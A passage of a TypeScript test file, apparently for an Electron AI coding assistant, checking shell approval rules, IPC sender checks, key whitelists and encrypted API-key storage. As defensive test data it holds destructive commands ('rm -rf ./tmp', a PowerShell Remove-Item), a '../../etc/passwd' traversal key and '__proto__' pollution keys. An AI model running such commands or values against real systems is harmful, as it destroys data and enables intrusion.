    vi.doMock("electron", () => ({ app: { getPath: () => process.cwd() } }))
    const mod = await import("../src/main/telemetry-store")
    mod.trackEvent("app_launch", { ret: "0" })
    mod.trackEvent("onboarding_completed", { provider: "openai" })
    mod.trackEvent("first_message_sent", { mode: "ask" })
    const f = mod.getFunnelSnapshot()
    expect(f.launched).toBe(1)
    expect(f.onboarded).toBe(1)
    expect(f.firstMessage).toBe(1)
    expect(f.rates.onboardRate).toBeCloseTo(1, 5)
    expect(f.rates.firstMessageRate).toBeCloseTo(1, 5)
  })
})

describe("command palette extended", () => {
  // 锁定渲染层 CommandPaletteItem 扩展字段的兼容:icon / run 可为任意类型,
  // filterCommands 不读它们(只看 title + hint),从而避免在 shared 上下文里
  // 强行依赖 React 节点类型。
  it("ignores icon and run fields when filtering", () => {
    const items: CommandItem[] = [
      { id: "a", title: "新建会话", hint: "Cmd+N", icon: "x", run: () => 1 },
      { id: "b", title: "打开设置", hint: "Cmd+,", icon: null, run: undefined },
    ]
    const r = filterCommands(items, "新建")
    expect(r.map((i) => i.id)).toEqual(["a"])
  })

  it("treats missing hint as empty string (no crash on undefined)", () => {
    const items: CommandItem[] = [{ id: "a", title: "only-title" }]
    expect(() => filterCommands(items, "anything")).not.toThrow()
    expect(filterCommands(items, "title")).toHaveLength(1)
  })

  it("keeps original order for empty query (FIFO)", () => {
    const items: CommandItem[] = [
      { id: "1", title: "A" },
      { id: "2", title: "B" },
      { id: "3", title: "C" },
    ]
    expect(filterCommands(items, "").map((i) => i.id)).toEqual(["1", "2", "3"])
  })
})

describe("onboarding flow invariants", () => {
  // 锁住"三屏欢迎 → wizard → 完成"的最小事件序列契约 — App.tsx 集成时
  // 会按这个顺序 track,缺一会让 funnel 算出来偏。
  it("canonical happy-path event sequence", () => {
    const sequence: string[] = [
      "app_launch",
      "onboarding_started",
      "onboarding_welcome_seen",
      "onboarding_provider_chosen",
      "onboarding_api_key_pasted",
      "onboarding_api_key_validated",
      "onboarding_workspace_chosen",
      "onboarding_completed",
      "first_message_sent",
    ]
    // 每个名字都应能序列化,key 不会漏
    for (const n of sequence) {
      const ev: TelemetryEvent = { name: n as never, ts: 1 }
      expect(ev.name).toBe(n)
    }
  })
})

describe("renderer navigation policy", () => {
  it("allows only the current packaged file or current dev origin", () => {
    expect(
      isAllowedAppNavigation(
        "file:///C:/Program%20Files/Dave/resources/app.asar/out/renderer/index.html",
        "file:///C:/Program%20Files/Dave/resources/app.asar/out/renderer/index.html",
      ),
    ).toBe(true)
    expect(isAllowedAppNavigation("http://localhost:5173/settings", "http://localhost:5173/")).toBe(
      true,
    )
  })

  it("blocks external origins, other files, and malformed URLs", () => {
    expect(isAllowedAppNavigation("https://example.com", "http://localhost:5173/")).toBe(false)
    expect(
      isAllowedAppNavigation(
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "file:///C:/app/index.html",
      ),
    ).toBe(false)
    expect(isAllowedAppNavigation("not-a-url", "file:///C:/app/index.html")).toBe(false)
  })
})

describe("virtual scroll FPS statistics", () => {
  it("returns zeroed statistics for empty or invalid samples", () => {
    expect(calculateFpsStats([])).toEqual({
      avg: 0,
      min: 0,
      max: 0,
      total: 0,
      durationMs: 0,
      p50FrameMs: 0,
      p95FrameMs: 0,
      p99FrameMs: 0,
      over16Ms: 0,
      over33Ms: 0,
      over50Ms: 0,
      stutterRate: 0,
    })
    expect(calculateFpsStats([0, -1, Number.NaN, Number.POSITIVE_INFINITY]).total).toBe(0)
  })

  it("calculates average FPS from total frames over total duration", () => {
    const stats = calculateFpsStats([8, 24])
    expect(stats.avg).toBeCloseTo(62.5)
    expect(stats.avg).not.toBeCloseTo((1000 / 8 + 1000 / 24) / 2)
    expect(stats.min).toBeCloseTo(1000 / 24)
    expect(stats.max).toBe(125)
  })

  it("uses nearest-rank percentiles and counts slow frames", () => {
    const samples = Array.from({ length: 20 }, (_, index) => index + 1)
    const stats = calculateFpsStats(samples)
    expect(stats.p50FrameMs).toBe(10)
    expect(stats.p95FrameMs).toBe(19)
    expect(stats.p99FrameMs).toBe(20)
    expect(stats.over16Ms).toBe(4)
    expect(stats.over33Ms).toBe(0)
    expect(stats.over50Ms).toBe(0)
    expect(stats.stutterRate).toBe(0)
  })

  it("reports stutter rate from frames slower than 33.3ms", () => {
    const stats = calculateFpsStats([16, 34, 51, 10])
    expect(stats.over16Ms).toBe(2)
    expect(stats.over33Ms).toBe(2)
    expect(stats.over50Ms).toBe(1)
    expect(stats.stutterRate).toBe(50)
  })
})

describe("startup performance budgets", () => {
  // 锁住产品规约里的三道预算:首启 60s、首问 5s、冷窗口 3s。
  // 主进程 ready-to-show / 渲染端 onChunk 第一帧分别用这些函数。
  it("exposes the three budget constants as single tunable", () => {
    // 防有人在 store / 工具里悄悄改大,影响产品规约
    expect(FIRST_RUN_BUDGET_MS).toBe(60_000)
    expect(TTFB_BUDGET_MS).toBe(5_000)
    expect(COLD_WINDOW_BUDGET_MS).toBe(3_000)
  })

  it("flags first_run within budget at 30s", () => {
    const v = checkStartupBudget("first_run", 30_000)
    expect(v.within).toBe(true)
    expect(v.budget).toBe(FIRST_RUN_BUDGET_MS)
    expect(v.over).toBeLessThan(0)
  })

  it("flags first_run over budget at 90s", () => {
    const v = checkStartupBudget("first_run", 90_000)
    expect(v.within).toBe(false)
    expect(v.over).toBe(30_000)
  })

  it("flags ttfb within budget at 3s", () => {
    const v = checkStartupBudget("ttfb", 3_000)
    expect(v.within).toBe(true)
    expect(v.over).toBeLessThan(0)
  })

  it("flags ttfb over budget at 6s", () => {
    const v = checkStartupBudget("ttfb", 6_000)
    expect(v.within).toBe(false)
    expect(v.over).toBe(1_000)
  })

  it("flags cold_window within budget at 1.5s", () => {
    const v = checkStartupBudget("cold_window", 1_500)
    expect(v.within).toBe(true)
  })

  it("treats exactly-at-budget as within (boundary is inclusive)", () => {
    // 边界:elapsed == budget 视为 within,便于测试可重复断言
    const v1 = checkStartupBudget("ttfb", TTFB_BUDGET_MS)
    expect(v1.within).toBe(true)
    expect(v1.over).toBe(0)
  })

  it("cold_window over budget at 5s", () => {
    const v = checkStartupBudget("cold_window", 5_000)
    expect(v.within).toBe(false)
    expect(v.over).toBe(2_000)
  })
})

describe("shell policy — edge cases", () => {
  // 锁定空白 / 控制字符 / 解释器变体 等边界
  it("treats tab/newline-only as empty command", () => {
    expect(deniedShellReason("\t")).toBe("空命令")
    expect(deniedShellReason("\n")).toBe("空命令")
    expect(deniedShellReason("\t\n  \n")).toBe("空命令")
  })

  it("treats null / undefined input as empty", () => {
    // TS 编译不允许 undefined 进来,但运行时 IPC 仍可能传 null — 兜住
    expect(deniedShellReason(null as unknown as string)).toBe("空命令")
    expect(deniedShellReason(undefined as unknown as string)).toBe("空命令")
  })

  it("isElevatedShellRisk returns false for empty/whitespace", () => {
    expect(isElevatedShellRisk("")).toBe(false)
    expect(isElevatedShellRisk("   ")).toBe(false)
    expect(isElevatedShellRisk("\n\t")).toBe(false)
  })

  it("flags pwsh -Command with elevated body", () => {
    // powershell / pwsh 在第一段危险工具列表里,出现即 elevated
    expect(isElevatedShellRisk("pwsh -Command Remove-Item foo.txt")).toBe(true)
  })

  it("flags powershell.exe (Windows variant) via dot-suffix match", () => {
    // ELEVATED_SHELL_RE 第 2 段用 `powershell` 关键字匹配,带不带 .exe 都覆盖
    expect(isElevatedShellRisk("powershell.exe -Command Get-Date")).toBe(true)
  })
})

describe("needsApproval — approval matrix edges", () => {
  // 锁定 4 种模式 × shell / mutates / read-only 三种工具的判断
  const readTool = getTool("read_file")!
  const writeTool = getTool("write_file")!
  const shellTool = getTool("shell")!

  it("ask mode never asks approval (loop has no tools)", () => {
    expect(needsApproval(readTool, "ask")).toBe(false)
    expect(needsApproval(writeTool, "ask")).toBe(false)
    expect(needsApproval(shellTool, "ask")).toBe(false)
  })

  it("suggest mode asks for mutating OR shell tools", () => {
    expect(needsApproval(readTool, "suggest")).toBe(false)
    expect(needsApproval(writeTool, "suggest")).toBe(true)
    expect(needsApproval(shellTool, "suggest")).toBe(true)
  })

  it("auto mode only asks for shell", () => {
    expect(needsApproval(readTool, "auto")).toBe(false)
    expect(needsApproval(writeTool, "auto")).toBe(false)
    expect(needsApproval(shellTool, "auto")).toBe(true)
  })

  it("full-auto automatically mutates files but always asks for shell", () => {
    expect(needsApproval(readTool, "full-auto")).toBe(false)
    expect(needsApproval(writeTool, "full-auto")).toBe(false)
    expect(needsApproval(shellTool, "full-auto", { command: "echo hi" })).toBe(true)
    expect(needsApproval(shellTool, "full-auto", { command: "rm -rf ./tmp" })).toBe(true)
  })

  it("full-auto shell without args.command still requires approval", () => {
    expect(needsApproval(shellTool, "full-auto", {})).toBe(true)
  })

  it("unknown mode falls back to approval (safe default)", () => {
    // 防御:未来若新增 mode,行为应是"宁可审批也不跳过"
    expect(needsApproval(readTool, "bogus" as never)).toBe(true)
  })
})

describe("toolDefsFor — registry shape", () => {
  it("returns OpenAI-style function definitions", () => {
    const defs = toolDefsFor("openai")
    expect(defs.length).toBeGreaterThan(0)
    for (const d of defs) {
      expect(d.type).toBe("function")
      const fn = (d as { function: { name: string; description: string; parameters: unknown } })
        .function
      expect(typeof fn.name).toBe("string")
      expect(typeof fn.description).toBe("string")
      expect(fn.parameters).toBeTruthy()
    }
  })

  it("filters out file_tree (UI-only, not for model)", () => {
    const defs = toolDefsFor("openai") as Array<{ function: { name: string } }>
    const names = defs.map((d) => d.function.name)
    expect(names).not.toContain("file_tree")
    // 必须包含 propose_patch(LLM 看到 diff 后由用户确认 apply)
    expect(names).toContain("propose_patch")
  })
})

describe("extractDelta — provider-specific edge cases", () => {
  it("returns empty for Anthropic message_start (no delta yet)", () => {
    expect(extractDelta("anthropic", { type: "message_start" })).toBe("")
    expect(extractDelta("anthropic", { type: "ping" })).toBe("")
  })

  it("returns empty for Anthropic content_block_delta without text", () => {
    expect(extractDelta("anthropic", { type: "content_block_delta", delta: {} })).toBe("")
    expect(
      extractDelta("anthropic", { type: "content_block_delta", delta: { text: undefined } }),
    ).toBe("")
  })

  it("returns empty for OpenAI when choices is empty array", () => {
    expect(extractDelta("openai", { choices: [] })).toBe("")
  })

  it("returns empty for OpenAI when choices[0].delta is missing", () => {
    expect(extractDelta("openai", { choices: [{}] })).toBe("")
    expect(extractDelta("openai", { choices: [{ delta: {} }] })).toBe("")
  })

  it("handles nullish input without throwing", () => {
    expect(extractDelta("openai", null)).toBe("")
    expect(extractDelta("openai", undefined)).toBe("")
    expect(extractDelta("anthropic", null)).toBe("")
  })

  it("Anthropic input_json_delta returns empty (text-only expected)", () => {
    // 输入块通常不进 content 累加,返回空字符串
    expect(
      extractDelta("anthropic", {
        type: "content_block_delta",
        delta: { type: "input_json_delta", partial_json: "{}" },
      }),
    ).toBe("")
  })
})

describe("truncateMessages — extreme edges", () => {
  it("returns empty array unchanged", () => {
    expect(truncateMessages([], 100)).toEqual([])
  })

  it("returns only-systems when all rest exceed budget", () => {
    const msgs = [
      { role: "system" as const, content: "sys" },
      { role: "user" as const, content: "huge ".repeat(10_000) },
      { role: "assistant" as const, content: "huge ".repeat(10_000) },
    ]
    const kept = truncateMessages(msgs, 50)
    // system 永远保留
    expect(kept.some((m) => m.role === "system")).toBe(true)
    // 至少保留一条 rest(项目硬约束:永不丢最后一条消息,允许非 user)
    expect(kept.length).toBeGreaterThanOrEqual(2)
    // budget 极小时,assistant 是被留下的最后一条 rest
    expect(kept[kept.length - 1].role).toBe("assistant")
  })

  it("always keeps the last message even if it alone exceeds budget", () => {
    const msgs = [
      { role: "user" as const, content: "old " },
      { role: "assistant" as const, content: "old reply " },
      { role: "user" as const, content: "latest question" },
    ]
    const kept = truncateMessages(msgs, 1) // 极小预算
    expect(kept[kept.length - 1].content).toBe("latest question")
  })
})

describe("parseUnifiedPatch — edge inputs", () => {
  it("rejects empty patch body with explicit error", () => {
    expect(() => parseUnifiedPatch("")).toThrow(/未识别任何文件头/)
    expect(() => parseUnifiedPatch("\n\n")).toThrow(/未识别任何文件头/)
  })

  it("normalizes @@ patch prefix and codex Begin/End markers", () => {
    const body = `@@ patch
*** Begin Patch
*** Update File: foo.ts
--- a/foo.ts
+++ b/foo.ts
@@ -1 +1 @@
-a
+b
*** End Patch
`
    const files = parseUnifiedPatch(body)
    expect(files[0].path).toBe("foo.ts")
  })

  it("skips /dev/null entries (delete / new file markers)", () => {
    // diff 库里 /dev/null 表示新增/删除,应被解析层过滤 → 没有可用文件 → 抛错
    const body = `--- a/x.ts
+++ /dev/null
@@ -1 +0,0 @@
-old
`
    expect(() => parseUnifiedPatch(body)).toThrow(/未识别任何文件头/)
  })
})

describe("applyPatchToText — null/missing params", () => {
  it("throws when structured is null", () => {
    expect(() => applyPatchToText("hello", null as unknown as never)).toThrow(/patch 应用失败/)
  })
})

describe("SessionRuntime — repeated abort & approval interactions", () => {
  it("abortSession is idempotent on same session", () => {
    const rt = new SessionRuntime()
    rt.beginAbortScope("s")
    rt.abortSession("s")
    rt.abortSession("s")
    rt.abortSession("s")
    expect(rt.getSignal("s")?.aborted).toBe(true)
  })

  it("abortSession after clearAbort leaves no controller", () => {
    const rt = new SessionRuntime()
    rt.beginAbortScope("s")
    rt.clearAbort("s")
    expect(rt.getSignal("s")).toBeUndefined()
    // 没有 controller 不会抛,只是 no-op
    expect(() => rt.abortSession("s")).not.toThrow()
    expect(rt.getSignal("s")).toBeUndefined()
  })

  it("resolveApproval after abortSession is no-op", async () => {
    const rt = new SessionRuntime()
    const p = rt.waitApproval("s", 60_000)
    rt.abortSession("s")
    await expect(p).resolves.toBe(false)
    // 再次 resolve 是 no-op
    expect(rt.resolveApproval("s", true)).toBe(false)
  })

  it("beginAbortScope after clearAbort creates fresh signal", () => {
    const rt = new SessionRuntime()
    const a = rt.beginAbortScope("s")
    rt.clearAbort("s")
    const b = rt.beginAbortScope("s")
    expect(b.aborted).toBe(false)
    expect(a).not.toBe(b)
  })

  it("hasActiveAbort reports controller presence", () => {
    const rt = new SessionRuntime()
    expect(rt.hasActiveAbort("s")).toBe(false)
    rt.beginAbortScope("s")
    expect(rt.hasActiveAbort("s")).toBe(true)
    rt.clearAbort("s")
    expect(rt.hasActiveAbort("s")).toBe(false)
  })
})

describe("telemetry event-name allowlist (security)", () => {
  // 锁住 IPC handler 拒绝未知事件名的契约 — 防止渲染端被注入撑爆 store
  it("TELEMETRY_EVENT_NAMES contains every TelemetryEventName literal", () => {
    // 用一个假的类型断言:如果 TELEMETRY_EVENT_NAMES 与类型不同步,satisfies 编译会失败
    // 这里我们只验证它非空且都是字符串
    expect(TELEMETRY_EVENT_NAMES.length).toBeGreaterThan(0)
    for (const n of TELEMETRY_EVENT_NAMES) {
      expect(typeof n).toBe("string")
      expect(n.length).toBeGreaterThan(0)
    }
  })

  it("Set-based allowlist rejects unknown event names", () => {
    // 直接验证主进程 helper 的语义(无需 import 主进程,在 node 端复现)
    const allow = new Set<string>(TELEMETRY_EVENT_NAMES)
    expect(allow.has("app_launch")).toBe(true)
    expect(allow.has("totally-bogus-event-name")).toBe(false)
    expect(allow.has("")).toBe(false)
  })
})

describe("store-policy — IPC key whitelist + title sanitization", () => {
  // 锁住 IPC store-* handler 的 key 白名单契约:防止渲染端被注入后
  // 写入 __proto__ / 任意业务无关字段撑爆 electron-store 文件。

  it("isAllowedStoreKey accepts whitelisted keys", () => {
    expect(isAllowedStoreKey("theme")).toBe(true)
    expect(isAllowedStoreKey("cwd")).toBe(true)
    expect(isAllowedStoreKey("mode")).toBe(true)
    expect(isAllowedStoreKey("last-session-id")).toBe(true)
    expect(isAllowedStoreKey("provider")).toBe(true)
    expect(isAllowedStoreKey("onboarding_completed")).toBe(true)
    expect(isAllowedStoreKey("onboarding_skipped")).toBe(true)
  })

  it("isAllowedStoreKey accepts ${provider}-api-key pattern", () => {
    expect(isAllowedStoreKey("openai-api-key")).toBe(true)
    expect(isAllowedStoreKey("anthropic-api-key")).toBe(true)
    expect(isAllowedStoreKey("deepseek-api-key")).toBe(true)
    expect(isAllowedStoreKey("custom-api-key")).toBe(true)
  })

  it("isAllowedStoreKey rejects unknown / suspicious keys", () => {
    // 未知 key
    expect(isAllowedStoreKey("unknown-key")).toBe(false)
    // 原型污染尝试
    expect(isAllowedStoreKey("__proto__")).toBe(false)
    expect(isAllowedStoreKey("constructor")).toBe(false)
    expect(isAllowedStoreKey("prototype")).toBe(false)
    // 路径穿越风格
    expect(isAllowedStoreKey("../../etc/passwd")).toBe(false)
    // 伪造 provider 后缀(不在 4 个 provider 列表内)
    expect(isAllowedStoreKey("google-api-key")).toBe(false)
    expect(isAllowedStoreKey("azure-api-key")).toBe(false)
    // 空字符串
    expect(isAllowedStoreKey("")).toBe(false)
  })

  it("isAllowedStoreKey rejects non-string and oversize inputs", () => {
    expect(isAllowedStoreKey(null)).toBe(false)
    expect(isAllowedStoreKey(undefined)).toBe(false)
    expect(isAllowedStoreKey(42)).toBe(false)
    expect(isAllowedStoreKey({})).toBe(false)
    expect(isAllowedStoreKey("a".repeat(65))).toBe(false)
    // 64 字符仍允许(边界)
    expect(isAllowedStoreKey("a".repeat(64))).toBe(false) // 不在白名单也不匹配 api-key 模式
  })

  it("STORE_VALUE_MAX is reasonable (16K)", () => {
    // 防止误改成 16M 或 16 字节:16K 足够 theme/cwd/api-key 等配置字段。
    expect(STORE_VALUE_MAX).toBe(16_384)
    expect(STORE_VALUE_MAX).toBeGreaterThan(1024)
    expect(STORE_VALUE_MAX).toBeLessThan(1024 * 1024)
  })

  it("sanitizeSessionTitle trims and truncates oversize input", () => {
    // 正常 trim
    expect(sanitizeSessionTitle("  hello  ")).toBe("hello")
    // 截断到 SESSION_TITLE_MAX
    const long = "x".repeat(SESSION_TITLE_MAX + 50)
    const safe = sanitizeSessionTitle(long)
    expect(safe).not.toBeNull()
    expect(safe!.length).toBe(SESSION_TITLE_MAX)
    // 边界:正好 SESSION_TITLE_MAX 不截断
    const exact = "y".repeat(SESSION_TITLE_MAX)
    expect(sanitizeSessionTitle(exact)).toBe(exact)
  })

  it("sanitizeSessionTitle returns null for empty / non-string", () => {
    expect(sanitizeSessionTitle("")).toBeNull()
    expect(sanitizeSessionTitle("   ")).toBeNull()
    expect(sanitizeSessionTitle("\t\n")).toBeNull()
    expect(sanitizeSessionTitle(null)).toBeNull()
    expect(sanitizeSessionTitle(undefined)).toBeNull()
    expect(sanitizeSessionTitle(42)).toBeNull()
    expect(sanitizeSessionTitle({})).toBeNull()
  })

  it("SESSION_TITLE_MAX is 80 (covers manual rename)", () => {
    // autoTitleSession 用 40 截断自动标题;手动重命名允许稍长,80 足够。
    expect(SESSION_TITLE_MAX).toBe(80)
  })
})

// =====================================================================
// secure-storage — Electron safeStorage 加解密封装
// 纯函数测试:不依赖 electron runtime,用 vi.doMock 注入 safeStorage。
// =====================================================================
describe("secure-storage", () => {
  beforeEach(() => {
    vi.resetModules()
  })

  it("encrypt/decrypt round-trip returns original plaintext", async () => {
    // Mock safeStorage:同步 API 加解密为 base64,验证 round-trip
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: {
        isEncryptionAvailable: () => true,
        encryptString: (s: string) => Buffer.from(`ENC:${s}`, "utf8"),
        decryptString: (b: Buffer) => b.toString("utf8").replace(/^ENC:/, ""),
      },
    }))
    const { initSecureStorage, encrypt, decrypt } = await import("../src/main/secure-storage")
    await initSecureStorage()
    const plain = "sk-test-key-12345"
    const hex = await encrypt(plain)
    expect(hex).not.toBeNull()
    const decrypted = await decrypt(hex!)
    expect(decrypted).toBe(plain)
  })

  it("encrypt returns null when safeStorage unavailable", async () => {
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: {
        isEncryptionAvailable: () => false,
      },
    }))
    const { initSecureStorage, encrypt, isSecureStorageAvailable } =
      await import("../src/main/secure-storage")
    await initSecureStorage()
    expect(isSecureStorageAvailable()).toBe(false)
    const result = await encrypt("secret")
    expect(result).toBeNull()
  })

  it("encrypt returns null for empty input", async () => {
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: {
        isEncryptionAvailable: () => true,
        encryptString: (s: string) => Buffer.from(s),
        decryptString: (b: Buffer) => b.toString(),
      },
    }))
    const { initSecureStorage, encrypt } = await import("../src/main/secure-storage")
    await initSecureStorage()
    expect(await encrypt("")).toBeNull()
  })

  it("decrypt returns null for empty input", async () => {
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: {
        isEncryptionAvailable: () => true,
        encryptString: (s: string) => Buffer.from(s),
        decryptString: (b: Buffer) => b.toString(),
      },
    }))
    const { initSecureStorage, decrypt } = await import("../src/main/secure-storage")
    await initSecureStorage()
    expect(await decrypt("")).toBeNull()
  })
})

// =====================================================================
// store — setSecure/getSecure 加密路径
// 验证 API Key 字段(-api-key 结尾)走加密,普通 key 走明文。
// =====================================================================
describe("store secure helpers", () => {
  beforeEach(() => {
    vi.resetModules()
  })

  it("getSecure returns plain value for non-api-key fields", async () => {
    const storeData: Record<string, unknown> = { theme: "night", cwd: "/home" }
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: { isEncryptionAvailable: () => false },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        store: Record<string, unknown> = storeData
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { getSecure } = await import("../src/main/store")
    const result = await getSecure("theme")
    expect(result).toBe("night")
  })

  it("setSecure stores api-key fields via encryption", async () => {
    const storeData: Record<string, unknown> = {}
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: {
        isEncryptionAvailable: () => true,
        encryptString: (s: string) => Buffer.from(`ENC:${s}`),
        decryptString: (b: Buffer) => b.toString().replace(/^ENC:/, ""),
      },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        store: Record<string, unknown> = storeData
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { setSecure, getSecure } = await import("../src/main/store")
    await setSecure("openai-api-key", "sk-secret")
    // 应存储加密后的 hex,不是明文
    expect(storeData["openai-api-key"]).not.toBe("sk-secret")
    // getSecure 应解密回明文
    const decrypted = await getSecure("openai-api-key")
    expect(decrypted).toBe("sk-secret")
  })

  it("setSecure stores non-api-key fields in plain text", async () => {
    const storeData: Record<string, unknown> = {}
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: { isEncryptionAvailable: () => true },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        store: Record<string, unknown> = storeData
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { setSecure, getSecure } = await import("../src/main/store")
    await setSecure("theme", "night")
    expect(storeData["theme"]).toBe("night")
    expect(await getSecure("theme")).toBe("night")
  })

  it("setSecure refuses API key persistence when safeStorage is unavailable", async () => {
    const storeData: Record<string, unknown> = {}
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: { isEncryptionAvailable: () => false },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { setSecure } = await import("../src/main/store")
    await expect(setSecure("openai-api-key", "sk-secret")).rejects.toThrow(/安全存储不可用/)
    expect(storeData["openai-api-key"]).toBeUndefined()
  })

  it("getSecure refuses legacy plaintext and unrecognized values", async () => {
    const storeData: Record<string, unknown> = { "openai-api-key": "sk-legacy-plaintext" }
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: { isEncryptionAvailable: () => true },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { getSecure } = await import("../src/main/store")
    expect(await getSecure("openai-api-key")).toBeNull()
  })

  it("setSecure deletes key when value is empty", async () => {
    const storeData: Record<string, unknown> = { "openai-api-key": "old-enc" }
    vi.doMock("electron", () => ({
      app: { getPath: () => "/tmp" },
      safeStorage: { isEncryptionAvailable: () => true },
    }))
    vi.doMock("electron-store", () => ({
      __esModule: true,
      default: class MockStore {
        store: Record<string, unknown> = storeData
        get(k: string) {
          return storeData[k]
        }
        set(k: string, v: unknown) {
          storeData[k] = v
        }
        delete(k: string) {
          delete storeData[k]
        }
      },
    }))
    const { setSecure, getSecure } = await import("../src/main/store")
    await setSecure("openai-api-key", "")
    expect("openai-api-key" in storeData).toBe(false)
    expect(await getSecure("openai-api-key")).toBeNull()
  })
})

// =====================================================================
// validateSender — IPC 来源校验
// 防止其他窗口/子进程绕过白名单发 IPC。生产模式严格,开发模式放行。
// =====================================================================
describe("validateSender — IPC origin validation", () => {
  beforeEach(() => {
    vi.resetModules()
  })

  it("allows only the trusted main-window top frame in development", async () => {
    vi.doMock("electron", () => ({
      app: { isPackaged: false, getPath: () => "/tmp" },
    }))
    const { validateSender } = await import("../src/main/ipc")
    const frame: { url: string; top?: unknown } = { url: "http://localhost:5173/" }
    frame.top = frame
    const main = { webContents: { id: 1 } } as never
    expect(validateSender({ sender: { id: 1 }, senderFrame: frame }, main)).toBe(true)
    expect(validateSender({ sender: { id: 2 }, senderFrame: frame }, main)).toBe(false)
    expect(
      validateSender(
        { sender: { id: 1 }, senderFrame: { url: "http://evil.test/", top: undefined } },
        main,
      ),
    ).toBe(false)
  })

  it("requires a trusted packaged file URL and rejects missing or child frames", async () => {
    vi.doMock("electron", () => ({
      app: { isPackaged: true, getPath: () => "/tmp" },
    }))
    const { validateSender } = await import("../src/main/ipc")
    const main = { webContents: { id: 1 } } as never
    const top: { url: string; top?: unknown } = { url: "file:///app/out/renderer/index.html" }
    top.top = top
    expect(validateSender({ sender: { id: 1 }, senderFrame: top }, main)).toBe(true)
    expect(validateSender({ sender: { id: 1 }, senderFrame: null }, main)).toBe(false)
    expect(
      validateSender(
        {
          sender: { id: 1 },
          senderFrame: { url: "file:///app/frame.html", top: { url: "file:///app/index.html" } },
        },
        main,
      ),
    ).toBe(false)
    const httpFrame: { url: string; top?: unknown } = { url: "https://example.com/" }
    httpFrame.top = httpFrame
    expect(validateSender({ sender: { id: 1 }, senderFrame: httpFrame }, main)).toBe(false)
  })
})

// =====================================================================
// rate-limit — 敏感 IPC 滑动窗口
// =====================================================================
describe("createRateLimiter", () => {
  it("allows up to max calls then blocks within the window", () => {
    const t = 1_000
    const limiter = createRateLimiter({ max: 3, windowMs: 1_000, now: () => t })
    expect(limiter.allow()).toBe(true)
    expect(limiter.allow()).toBe(true)
    expect(limiter.allow()).toBe(true)
    expect(limiter.allow()).toBe(false)
    expect(limiter.used()).toBe(3)
  })

  it("slides the window so old hits expire", () => {
    let t = 0
    const limiter = createRateLimiter({ max: 2, windowMs: 100, now: () => t })
    expect(limiter.allow()).toBe(true)
    t = 50
    expect(limiter.allow()).toBe(true)
    expect(limiter.allow()).toBe(false)
    t = 101
    expect(limiter.allow()).toBe(true)
    expect(limiter.used()).toBe(2)
  })

  it("reset clears the window", () => {
    const limiter = createRateLimiter({ max: 1, windowMs: 1_000, now: () => 0 })
    expect(limiter.allow()).toBe(true)
    expect(limiter.allow()).toBe(false)
    limiter.reset()
    expect(limiter.allow()).toBe(true)
  })
})

// =====================================================================
// markdown-throttle — 流式解析节流决策
// =====================================================================
describe("shouldUpdateMarkdown", () => {
  it("always updates immediately when not streaming", () => {
    expect(shouldUpdateMarkdown(false, 0)).toEqual({ updateNow: true, delayMs: 0 })
  })

  it("updates immediately when elapsed exceeds interval while streaming", () => {
    expect(shouldUpdateMarkdown(true, 120, 120)).toEqual({ updateNow: true, delayMs: 0 })
    expect(shouldUpdateMarkdown(true, 200, 120)).toEqual({ updateNow: true, delayMs: 0 })
  })

  it("defers when streaming and elapsed is under interval", () => {
    expect(shouldUpdateMarkdown(true, 40, 120)).toEqual({ updateNow: false, delayMs: 80 })
  })
})

// =====================================================================
// session-edit — 编辑 / 再生成截断
// =====================================================================
describe("session-edit helpers", () => {
  const sample: ChatMessage[] = [
    { role: "user", content: "q1" },
    { role: "assistant", content: "a1" },
    { role: "user", content: "q2" },
    { role: "assistant", content: "a2" },
  ]

  it("messagesBeforeUserEdit keeps prefix before the edited user turn", () => {
    expect(messagesBeforeUserEdit(sample, 2)).toEqual([
      { role: "user", content: "q1" },
      { role: "assistant", content: "a1" },
    ])
    expect(messagesBeforeUserEdit(sample, 0)).toEqual([])
    expect(messagesBeforeUserEdit(sample, 1)).toBeNull()
    expect(messagesBeforeUserEdit(sample, 99)).toBeNull()
  })

  it("planRegenerate finds last user and drops trailing replies", () => {
    const plan = planRegenerate(sample)
    expect(plan).toEqual({
      prefix: [
        { role: "user", content: "q1" },
        { role: "assistant", content: "a1" },
      ],
      userContent: "q2",
      userIndex: 2,
    })
    expect(planRegenerate([])).toBeNull()
    expect(planRegenerate([{ role: "assistant", content: "only" }])).toBeNull()
  })

  it("sanitizeMessagesForReplace rejects malformed payloads", () => {
    expect(sanitizeMessagesForReplace(null)).toBeNull()
    expect(sanitizeMessagesForReplace([{ role: "hacker", content: "x" }])).toBeNull()
    expect(sanitizeMessagesForReplace([{ role: "user", content: 1 }])).toBeNull()
